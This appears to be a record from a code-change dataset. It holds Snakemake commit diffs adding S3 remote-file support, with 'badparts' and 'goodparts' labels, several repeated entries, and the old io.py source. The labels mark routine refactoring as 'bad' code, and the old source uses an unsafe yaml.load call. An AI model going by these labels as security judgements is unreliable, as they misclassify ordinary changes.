PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n","add":1,"remove":1,"filename":"\/snakemake\/dag.py","badparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"],"goodparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]},{"diff":"\n from functools import partial, lru_cache\n from operator import itemgetter, attrgetter\n \n-from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files\n+from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged\n from snakemake.jobs import Job, Reason\n from snakemake.exceptions import RuleException, MissingInputException\n from snakemake.exceptions import MissingRuleException, AmbiguousRuleException\n","add":1,"remove":1,"filename":"\/snakemake\/dag.py","badparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files"],"goodparts":["from snakemake.io import IOFile, _IOFile, PeriodicityDetector, wait_for_files, is_flagged"]}]},"\/snakemake\/io.py":{"changes":[{"diff":"\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"],"goodparts":["import functools","from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException","import snakemake.remote_providers.S3 as S3"]},{"diff":"\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n","add":45,"remove":3,"filename":"\/snakemake\/io.py","badparts":["    def protected(self):","        return self.exists and not os.access(self.file, os.W_OK)","        if not self.exists and lstat(self.file):"],"goodparts":["    @_referToRemote","    def exists_local(self):","        return os.path.exists(self.file)","    @property","    def exists_remote(self):","        return (self.is_remote and self.remote_object.exists())","    def protected(self):","        return self.exists_local and not os.access(self.file, os.W_OK)","    @property","    @_referToRemote","        return lstat(self.file).st_mtime","    @property","    def flags(self):","        return getattr(self._file, \"flags\", {})","    @property","    def mtime_local(self):","    @_referToRemote","    @property","    def size_local(self):","        self.check_broken_symlink()","        return os.path.getsize(self.file)","        if not self.exists_local and lstat(self.file):","    def download_from_remote(self):","        logger.info(\"Downloading from remote: {}\".format(self.file))","        if self.is_remote and self.remote_object.exists():","            self.remote_object.download()","        else:","            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")","    def upload_to_remote(self):","        logger.info(\"Uploading to remote: {}\".format(self.file))","        if self.is_remote and not self.remote_object.exists():","            self.remote_object.upload()","        else:","            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]},{"diff":"\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["    def touch(self):","            lutime(self.file, None)"],"goodparts":["    def touch(self, times=None):","        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"","            lutime(self.file, times)"]},{"diff":"\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n","add":12,"remove":2,"filename":"\/snakemake\/io.py","badparts":["        return IOFile(apply_wildcards(f, wildcards,","                      rule=self.rule)"],"goodparts":["        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})","        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,","                                      rule=self.rule)","        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))","        return fileWithWildcardsApplied"]},{"diff":"\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n","add":9,"remove":1,"filename":"\/snakemake\/io.py","badparts":["        return flag in value.flags"],"goodparts":["        return flag in value.flags and value.flags[flag]","    if isinstance(value, _IOFile):","        return flag in value.flags and value.flags[flag]","def get_flag_value(value, flag_type):","    if isinstance(value, AnnotatedString):","        if flag_type in value.flags:","            return value.flags[flag_type]","        else:","            return None"]},{"diff":"\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n","add":1,"remove":1,"filename":"\/snakemake\/io.py","badparts":["    annotated = flag(value, \"dynamic\")"],"goodparts":["    annotated = flag(value, \"dynamic\", True)"]},{"diff":"\n import stat\n import time\n import json\n+import functools\n from itertools import product, chain\n from collections import Iterable, namedtuple\n-from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\n+from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException\n from snakemake.logging import logger\n-\n+import snakemake.remote_providers.S3 as S3\n \n def lstat(f):\n     return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError"],"goodparts":["import functools","from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError, RemoteFileException, S3FileException","import snakemake.remote_providers.S3 as S3"]},{"diff":"\n                              \"may not be used directly.\")\n \n     @property\n+    @_referToRemote\n     def exists(self):\n         return os.path.exists(self.file)\n \n     @property\n-    def protected(self):\n-        return self.exists and not os.access(self.file, os.W_OK)\n+    def exists_local(self):\n+        return os.path.exists(self.file)\n+\n+    @property\n+    def exists_remote(self):\n+        return (self.is_remote and self.remote_object.exists())\n+    \n \n     @property\n+    def protected(self):\n+        return self.exists_local and not os.access(self.file, os.W_OK)\n+    \n+    @property\n+    @_referToRemote\n     def mtime(self):\n+        return lstat(self.file).st_mtime\n+\n+    @property\n+    def flags(self):\n+        return getattr(self._file, \"flags\", {})\n+\n+    @property\n+    def mtime_local(self):\n         # do not follow symlinks for modification time\n         return lstat(self.file).st_mtime\n \n     @property\n+    @_referToRemote\n     def size(self):\n         # follow symlinks but throw error if invalid\n         self.check_broken_symlink()\n         return os.path.getsize(self.file)\n \n+    @property\n+    def size_local(self):\n+        # follow symlinks but throw error if invalid\n+        self.check_broken_symlink()\n+        return os.path.getsize(self.file)\n+\n     def check_broken_symlink(self):\n         \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n-        if not self.exists and lstat(self.file):\n+        if not self.exists_local and lstat(self.file):\n             raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n \n     def is_newer(self, time):\n         return self.mtime > time\n \n+    def download_from_remote(self):\n+        logger.info(\"Downloading from remote: {}\".format(self.file))\n+\n+        if self.is_remote and self.remote_object.exists():\n+            self.remote_object.download()\n+        else:\n+            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")\n+ \n+    def upload_to_remote(self):\n+        logger.info(\"Uploading to remote: {}\".format(self.file))\n+\n+        if self.is_remote and not self.remote_object.exists():\n+            self.remote_object.upload()\n+        else:\n+            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")\n+\n     def prepare(self):\n         path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n         dir = os.path.dirname(path_until_wildcard)\n","add":45,"remove":3,"filename":"\/snakemake\/io.py","badparts":["    def protected(self):","        return self.exists and not os.access(self.file, os.W_OK)","        if not self.exists and lstat(self.file):"],"goodparts":["    @_referToRemote","    def exists_local(self):","        return os.path.exists(self.file)","    @property","    def exists_remote(self):","        return (self.is_remote and self.remote_object.exists())","    def protected(self):","        return self.exists_local and not os.access(self.file, os.W_OK)","    @property","    @_referToRemote","        return lstat(self.file).st_mtime","    @property","    def flags(self):","        return getattr(self._file, \"flags\", {})","    @property","    def mtime_local(self):","    @_referToRemote","    @property","    def size_local(self):","        self.check_broken_symlink()","        return os.path.getsize(self.file)","        if not self.exists_local and lstat(self.file):","    def download_from_remote(self):","        logger.info(\"Downloading from remote: {}\".format(self.file))","        if self.is_remote and self.remote_object.exists():","            self.remote_object.download()","        else:","            raise RemoteFileException(\"The file to be downloaded does not seem to exist remotely.\")","    def upload_to_remote(self):","        logger.info(\"Uploading to remote: {}\".format(self.file))","        if self.is_remote and not self.remote_object.exists():","            self.remote_object.upload()","        else:","            raise RemoteFileException(\"The file to be uploaded does not seem to exist remotely.\")"]},{"diff":"\n     def remove(self):\n         remove(self.file)\n \n-    def touch(self):\n+    def touch(self, times=None):\n+        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"\n         try:\n-            lutime(self.file, None)\n+            lutime(self.file, times)\n         except OSError as e:\n             if e.errno == 2:\n                 raise MissingOutputException(\n","add":3,"remove":2,"filename":"\/snakemake\/io.py","badparts":["    def touch(self):","            lutime(self.file, None)"],"goodparts":["    def touch(self, times=None):","        \"\"\" times must be 2-tuple: (atime, mtime) \"\"\"","            lutime(self.file, times)"]},{"diff":"\n         if self._is_function:\n             f = self._file(Namedlist(fromdict=wildcards))\n \n-        return IOFile(apply_wildcards(f, wildcards,\n+        # this bit ensures flags are transferred over to files after\n+        # wildcards are applied\n+\n+        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})\n+\n+\n+        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,\n                                       fill_missing=fill_missing,\n                                       fail_dynamic=fail_dynamic,\n                                       dynamic_fill=self.dynamic_fill),\n-                      rule=self.rule)\n+                                      rule=self.rule)\n+\n+        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))\n+\n+        return fileWithWildcardsApplied\n \n     def get_wildcard_names(self):\n         return get_wildcard_names(self.file)\n","add":12,"remove":2,"filename":"\/snakemake\/io.py","badparts":["        return IOFile(apply_wildcards(f, wildcards,","                      rule=self.rule)"],"goodparts":["        flagsBeforeWildcardResolution = getattr(f, \"flags\", {})","        fileWithWildcardsApplied = IOFile(apply_wildcards(f, wildcards,","                                      rule=self.rule)","        fileWithWildcardsApplied.set_flags(getattr(f, \"flags\", {}))","        return fileWithWildcardsApplied"]},{"diff":"\n \n def is_flagged(value, flag):\n     if isinstance(value, AnnotatedString):\n-        return flag in value.flags\n+        return flag in value.flags and value.flags[flag]\n+    if isinstance(value, _IOFile):\n+        return flag in value.flags and value.flags[flag]\n     return False\n \n+def get_flag_value(value, flag_type):\n+    if isinstance(value, AnnotatedString):\n+        if flag_type in value.flags:\n+            return value.flags[flag_type]\n+        else:\n+            return None\n \n def temp(value):\n     \"\"\"\n","add":9,"remove":1,"filename":"\/snakemake\/io.py","badparts":["        return flag in value.flags"],"goodparts":["        return flag in value.flags and value.flags[flag]","    if isinstance(value, _IOFile):","        return flag in value.flags and value.flags[flag]","def get_flag_value(value, flag_type):","    if isinstance(value, AnnotatedString):","        if flag_type in value.flags:","            return value.flags[flag_type]","        else:","            return None"]},{"diff":"\n     A flag for a file that shall be dynamic, i.e. the multiplicity\n     (and wildcard values) will be expanded after a certain\n     rule has been run \"\"\"\n-    annotated = flag(value, \"dynamic\")\n+    annotated = flag(value, \"dynamic\", True)\n     tocheck = [annotated] if not_iterable(annotated) else annotated\n     for file in tocheck:\n         matches = list(_wildcard_regex.finditer(file))\n","add":1,"remove":1,"filename":"\/snakemake\/io.py","badparts":["    annotated = flag(value, \"dynamic\")"],"goodparts":["    annotated = flag(value, \"dynamic\", True)"]}],"source":"\n__author__=\"Johannes K\u00f6ster\" __copyright__=\"Copyright 2015, Johannes K\u00f6ster\" __email__=\"koester@jimmy.harvard.edu\" __license__=\"MIT\" import os import re import stat import time import json from itertools import product, chain from collections import Iterable, namedtuple from snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError from snakemake.logging import logger def lstat(f): return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks) def lutime(f, times): return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks) def lchmod(f, mode): return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks) def IOFile(file, rule=None): f=_IOFile(file) f.rule=rule return f class _IOFile(str): \"\"\" A file that is either input or output of a rule. \"\"\" dynamic_fill=\"__snakemake_dynamic__\" def __new__(cls, file): obj=str.__new__(cls, file) obj._is_function=type(file).__name__==\"function\" obj._file=file obj.rule=None obj._regex=None return obj @property def file(self): if not self._is_function: return self._file else: raise ValueError(\"This IOFile is specified as a function and \" \"may not be used directly.\") @property def exists(self): return os.path.exists(self.file) @property def protected(self): return self.exists and not os.access(self.file, os.W_OK) @property def mtime(self): return lstat(self.file).st_mtime @property def size(self): self.check_broken_symlink() return os.path.getsize(self.file) def check_broken_symlink(self): \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\" if not self.exists and lstat(self.file): raise WorkflowError(\"File{} seems to be a broken symlink.\".format(self.file)) def is_newer(self, time): return self.mtime > time def prepare(self): path_until_wildcard=re.split(self.dynamic_fill, self.file)[0] dir=os.path.dirname(path_until_wildcard) if len(dir) > 0 and not os.path.exists(dir): try: os.makedirs(dir) except OSError as e: if e.errno !=17: raise e def protect(self): mode=(lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~ stat.S_IWOTH) if os.path.isdir(self.file): for root, dirs, files in os.walk(self.file): for d in dirs: lchmod(os.path.join(self.file, d), mode) for f in files: lchmod(os.path.join(self.file, f), mode) else: lchmod(self.file, mode) def remove(self): remove(self.file) def touch(self): try: lutime(self.file, None) except OSError as e: if e.errno==2: raise MissingOutputException( \"Output file{} of rule{} shall be touched but \" \"does not exist.\".format(self.file, self.rule.name), lineno=self.rule.lineno, snakefile=self.rule.snakefile) else: raise e def touch_or_create(self): try: self.touch() except MissingOutputException: with open(self.file, \"w\") as f: pass def apply_wildcards(self, wildcards, fill_missing=False, fail_dynamic=False): f=self._file if self._is_function: f=self._file(Namedlist(fromdict=wildcards)) return IOFile(apply_wildcards(f, wildcards, fill_missing=fill_missing, fail_dynamic=fail_dynamic, dynamic_fill=self.dynamic_fill), rule=self.rule) def get_wildcard_names(self): return get_wildcard_names(self.file) def contains_wildcard(self): return contains_wildcard(self.file) def regex(self): if self._regex is None: self._regex=re.compile(regex(self.file)) return self._regex def constant_prefix(self): first_wildcard=_wildcard_regex.search(self.file) if first_wildcard: return self.file[:first_wildcard.start()] return self.file def match(self, target): return self.regex().match(target) or None def format_dynamic(self): return self.replace(self.dynamic_fill, \"{*}\") def __eq__(self, other): f=other._file if isinstance(other, _IOFile) else other return self._file==f def __hash__(self): return self._file.__hash__() _wildcard_regex=re.compile( \"\\{\\s*(?P<name>\\w+?)(\\s*,\\s*(?P<constraint>([^\\{\\}]+|\\{\\d+(,\\d+)?\\})*))?\\s*\\}\") def wait_for_files(files, latency_wait=3): \"\"\"Wait for given files to be present in filesystem.\"\"\" files=list(files) get_missing=lambda:[f for f in files if not os.path.exists(f)] missing=get_missing() if missing: logger.info(\"Waiting at most{} seconds for missing files.\".format( latency_wait)) for _ in range(latency_wait): if not get_missing(): return time.sleep(1) raise IOError(\"Missing files after{} seconds:\\n{}\".format( latency_wait, \"\\n\".join(get_missing()))) def get_wildcard_names(pattern): return set(match.group('name') for match in _wildcard_regex.finditer(pattern)) def contains_wildcard(path): return _wildcard_regex.search(path) is not None def remove(file): if os.path.exists(file): if os.path.isdir(file): try: os.removedirs(file) except OSError: pass else: os.remove(file) def regex(filepattern): f=[] last=0 wildcards=set() for match in _wildcard_regex.finditer(filepattern): f.append(re.escape(filepattern[last:match.start()])) wildcard=match.group(\"name\") if wildcard in wildcards: if match.group(\"constraint\"): raise ValueError( \"If multiple wildcards of the same name \" \"appear in a string, eventual constraints have to be defined \" \"at the first occurence and will be inherited by the others.\") f.append(\"(?P={})\".format(wildcard)) else: wildcards.add(wildcard) f.append(\"(?P<{}>{})\".format(wildcard, match.group(\"constraint\") if match.group(\"constraint\") else \".+\")) last=match.end() f.append(re.escape(filepattern[last:])) f.append(\"$\") return \"\".join(f) def apply_wildcards(pattern, wildcards, fill_missing=False, fail_dynamic=False, dynamic_fill=None, keep_dynamic=False): def format_match(match): name=match.group(\"name\") try: value=wildcards[name] if fail_dynamic and value==dynamic_fill: raise WildcardError(name) return str(value) except KeyError as ex: if keep_dynamic: return \"{{{}}}\".format(name) elif fill_missing: return dynamic_fill else: raise WildcardError(str(ex)) return re.sub(_wildcard_regex, format_match, pattern) def not_iterable(value): return isinstance(value, str) or not isinstance(value, Iterable) class AnnotatedString(str): def __init__(self, value): self.flags=dict() def flag(value, flag_type, flag_value=True): if isinstance(value, AnnotatedString): value.flags[flag_type]=flag_value return value if not_iterable(value): value=AnnotatedString(value) value.flags[flag_type]=flag_value return value return[flag(v, flag_type, flag_value=flag_value) for v in value] def is_flagged(value, flag): if isinstance(value, AnnotatedString): return flag in value.flags return False def temp(value): \"\"\" A flag for an input or output file that shall be removed after usage. \"\"\" if is_flagged(value, \"protected\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"temp\") def temporary(value): \"\"\" An alias for temp. \"\"\" return temp(value) def protected(value): \"\"\" A flag for a file that shall be write protected after creation. \"\"\" if is_flagged(value, \"temp\"): raise SyntaxError( \"Protected and temporary flags are mutually exclusive.\") return flag(value, \"protected\") def dynamic(value): \"\"\" A flag for a file that shall be dynamic, i.e. the multiplicity (and wildcard values) will be expanded after a certain rule has been run \"\"\" annotated=flag(value, \"dynamic\") tocheck=[annotated] if not_iterable(annotated) else annotated for file in tocheck: matches=list(_wildcard_regex.finditer(file)) for match in matches: if match.group(\"constraint\"): raise SyntaxError( \"The wildcards in dynamic files cannot be constrained.\") return annotated def touch(value): return flag(value, \"touch\") def expand(*args, **wildcards): \"\"\" Expand wildcards in given filepatterns. Arguments *args --first arg: filepatterns as list or one single filepattern, second arg(optional): a function to combine wildcard values (itertools.product per default) **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" filepatterns=args[0] if len(args)==1: combinator=product elif len(args)==2: combinator=args[1] if isinstance(filepatterns, str): filepatterns=[filepatterns] def flatten(wildcards): for wildcard, values in wildcards.items(): if isinstance(values, str) or not isinstance(values, Iterable): values=[values] yield[(wildcard, value) for value in values] try: return[filepattern.format(**comb) for comb in map(dict, combinator(*flatten(wildcards))) for filepattern in filepatterns] except KeyError as e: raise WildcardError(\"No values given for wildcard{}.\".format(e)) def limit(pattern, **wildcards): \"\"\" Limit wildcards to the given values. Arguments: **wildcards --the wildcards as keyword arguments with their values as lists \"\"\" return pattern.format(**{ wildcard: \"{{{},{}}}\".format(wildcard, \"|\".join(values)) for wildcard, values in wildcards.items() }) def glob_wildcards(pattern): \"\"\" Glob the values of the wildcards by matching the given pattern to the filesystem. Returns a named tuple with a list of values for each wildcard. \"\"\" pattern=os.path.normpath(pattern) first_wildcard=re.search(\"{[^{]\", pattern) dirname=os.path.dirname(pattern[:first_wildcard.start( )]) if first_wildcard else os.path.dirname(pattern) if not dirname: dirname=\".\" names=[match.group('name') for match in _wildcard_regex.finditer(pattern)] Wildcards=namedtuple(\"Wildcards\", names) wildcards=Wildcards(*[list() for name in names]) pattern=re.compile(regex(pattern)) for dirpath, dirnames, filenames in os.walk(dirname): for f in chain(filenames, dirnames): if dirpath !=\".\": f=os.path.join(dirpath, f) match=re.match(pattern, f) if match: for name, value in match.groupdict().items(): getattr(wildcards, name).append(value) return wildcards class Namedlist(list): \"\"\" A list that additionally provides functions to name items. Further, it is hashable, however the hash does not consider the item names. \"\"\" def __init__(self, toclone=None, fromdict=None, plainstr=False): \"\"\" Create the object. Arguments toclone --another Namedlist that shall be cloned fromdict --a dict that shall be converted to a Namedlist(keys become names) \"\"\" list.__init__(self) self._names=dict() if toclone: self.extend(map(str, toclone) if plainstr else toclone) if isinstance(toclone, Namedlist): self.take_names(toclone.get_names()) if fromdict: for key, item in fromdict.items(): self.append(item) self.add_name(key) def add_name(self, name): \"\"\" Add a name to the last item. Arguments name --a name \"\"\" self.set_name(name, len(self) -1) def set_name(self, name, index, end=None): \"\"\" Set the name of an item. Arguments name --a name index --the item index \"\"\" self._names[name]=(index, end) if end is None: setattr(self, name, self[index]) else: setattr(self, name, Namedlist(toclone=self[index:end])) def get_names(self): \"\"\" Get the defined names as(name, index) pairs. \"\"\" for name, index in self._names.items(): yield name, index def take_names(self, names): \"\"\" Take over the given names. Arguments names --the given names as(name, index) pairs \"\"\" for name,(i, j) in names: self.set_name(name, i, end=j) def items(self): for name in self._names: yield name, getattr(self, name) def allitems(self): next=0 for name, index in sorted(self._names.items(), key=lambda item: item[1][0]): start, end=index if end is None: end=start +1 if start > next: for item in self[next:start]: yield None, item yield name, getattr(self, name) next=end for item in self[next:]: yield None, item def insert_items(self, index, items): self[index:index +1]=items add=len(items) -1 for name,(i, j) in self._names.items(): if i > index: self._names[name]=(i +add, j +add) elif i==index: self.set_name(name, i, end=i +len(items)) def keys(self): return self._names def plainstrings(self): return self.__class__.__call__(toclone=self, plainstr=True) def __getitem__(self, key): try: return super().__getitem__(key) except TypeError: pass return getattr(self, key) def __hash__(self): return hash(tuple(self)) def __str__(self): return \" \".join(map(str, self)) class InputFiles(Namedlist): pass class OutputFiles(Namedlist): pass class Wildcards(Namedlist): pass class Params(Namedlist): pass class Resources(Namedlist): pass class Log(Namedlist): pass def _load_configfile(configpath): \"Tries to load a configfile first as JSON, then as YAML, into a dict.\" try: with open(configpath) as f: try: return json.load(f) except ValueError: f.seek(0) try: import yaml except ImportError: raise WorkflowError(\"Config file is not valid JSON and PyYAML \" \"has not been installed. Please install \" \"PyYAML to use YAML config files.\") try: return yaml.load(f) except yaml.YAMLError: raise WorkflowError(\"Config file is not valid JSON or YAML.\") except FileNotFoundError: raise WorkflowError(\"Config file{} not found.\".format(configpath)) def load_configfile(configpath): \"Loads a JSON or YAML configfile as a dict, then checks that it's a dict.\" config=_load_configfile(configpath) if not isinstance(config, dict): raise WorkflowError(\"Config file must be given as JSON or YAML \" \"with keys at top level.\") return config class PeriodicityDetector: def __init__(self, min_repeat=50, max_repeat=100): \"\"\" Args: max_len(int): The maximum length of the periodic substring. \"\"\" self.regex=re.compile( \"((?P<value>.+)(?P=value){{{min_repeat},{max_repeat}}})$\".format( min_repeat=min_repeat -1, max_repeat=max_repeat -1)) def is_periodic(self, value): \"\"\"Returns the periodic substring or None if not periodic.\"\"\" m=self.regex.search(value) if m is not None: return m.group(\"value\") ","sourceWithComments":"__author__ = \"Johannes K\u00f6ster\"\n__copyright__ = \"Copyright 2015, Johannes K\u00f6ster\"\n__email__ = \"koester@jimmy.harvard.edu\"\n__license__ = \"MIT\"\n\nimport os\nimport re\nimport stat\nimport time\nimport json\nfrom itertools import product, chain\nfrom collections import Iterable, namedtuple\nfrom snakemake.exceptions import MissingOutputException, WorkflowError, WildcardError\nfrom snakemake.logging import logger\n\n\ndef lstat(f):\n    return os.stat(f, follow_symlinks=os.stat not in os.supports_follow_symlinks)\n\n\ndef lutime(f, times):\n    return os.utime(f, times, follow_symlinks=os.utime not in os.supports_follow_symlinks)\n\n\ndef lchmod(f, mode):\n    return os.chmod(f, mode, follow_symlinks=os.chmod not in os.supports_follow_symlinks)\n\n\ndef IOFile(file, rule=None):\n    f = _IOFile(file)\n    f.rule = rule\n    return f\n\n\nclass _IOFile(str):\n    \"\"\"\n    A file that is either input or output of a rule.\n    \"\"\"\n\n    dynamic_fill = \"__snakemake_dynamic__\"\n\n    def __new__(cls, file):\n        obj = str.__new__(cls, file)\n        obj._is_function = type(file).__name__ == \"function\"\n        obj._file = file\n        obj.rule = None\n        obj._regex = None\n        return obj\n\n    @property\n    def file(self):\n        if not self._is_function:\n            return self._file\n        else:\n            raise ValueError(\"This IOFile is specified as a function and \"\n                             \"may not be used directly.\")\n\n    @property\n    def exists(self):\n        return os.path.exists(self.file)\n\n    @property\n    def protected(self):\n        return self.exists and not os.access(self.file, os.W_OK)\n\n    @property\n    def mtime(self):\n        # do not follow symlinks for modification time\n        return lstat(self.file).st_mtime\n\n    @property\n    def size(self):\n        # follow symlinks but throw error if invalid\n        self.check_broken_symlink()\n        return os.path.getsize(self.file)\n\n    def check_broken_symlink(self):\n        \"\"\" Raise WorkflowError if file is a broken symlink. \"\"\"\n        if not self.exists and lstat(self.file):\n            raise WorkflowError(\"File {} seems to be a broken symlink.\".format(self.file))\n\n    def is_newer(self, time):\n        return self.mtime > time\n\n    def prepare(self):\n        path_until_wildcard = re.split(self.dynamic_fill, self.file)[0]\n        dir = os.path.dirname(path_until_wildcard)\n        if len(dir) > 0 and not os.path.exists(dir):\n            try:\n                os.makedirs(dir)\n            except OSError as e:\n                # ignore Errno 17 \"File exists\" (reason: multiprocessing)\n                if e.errno != 17:\n                    raise e\n\n    def protect(self):\n        mode = (lstat(self.file).st_mode & ~stat.S_IWUSR & ~stat.S_IWGRP & ~\n                stat.S_IWOTH)\n        if os.path.isdir(self.file):\n            for root, dirs, files in os.walk(self.file):\n                for d in dirs:\n                    lchmod(os.path.join(self.file, d), mode)\n                for f in files:\n                    lchmod(os.path.join(self.file, f), mode)\n        else:\n            lchmod(self.file, mode)\n\n    def remove(self):\n        remove(self.file)\n\n    def touch(self):\n        try:\n            lutime(self.file, None)\n        except OSError as e:\n            if e.errno == 2:\n                raise MissingOutputException(\n                    \"Output file {} of rule {} shall be touched but \"\n                    \"does not exist.\".format(self.file, self.rule.name),\n                    lineno=self.rule.lineno,\n                    snakefile=self.rule.snakefile)\n            else:\n                raise e\n\n    def touch_or_create(self):\n        try:\n            self.touch()\n        except MissingOutputException:\n            # create empty file\n            with open(self.file, \"w\") as f:\n                pass\n\n    def apply_wildcards(self, wildcards,\n                        fill_missing=False,\n                        fail_dynamic=False):\n        f = self._file\n        if self._is_function:\n            f = self._file(Namedlist(fromdict=wildcards))\n\n        return IOFile(apply_wildcards(f, wildcards,\n                                      fill_missing=fill_missing,\n                                      fail_dynamic=fail_dynamic,\n                                      dynamic_fill=self.dynamic_fill),\n                      rule=self.rule)\n\n    def get_wildcard_names(self):\n        return get_wildcard_names(self.file)\n\n    def contains_wildcard(self):\n        return contains_wildcard(self.file)\n\n    def regex(self):\n        if self._regex is None:\n            # compile a regular expression\n            self._regex = re.compile(regex(self.file))\n        return self._regex\n\n    def constant_prefix(self):\n        first_wildcard = _wildcard_regex.search(self.file)\n        if first_wildcard:\n            return self.file[:first_wildcard.start()]\n        return self.file\n\n    def match(self, target):\n        return self.regex().match(target) or None\n\n    def format_dynamic(self):\n        return self.replace(self.dynamic_fill, 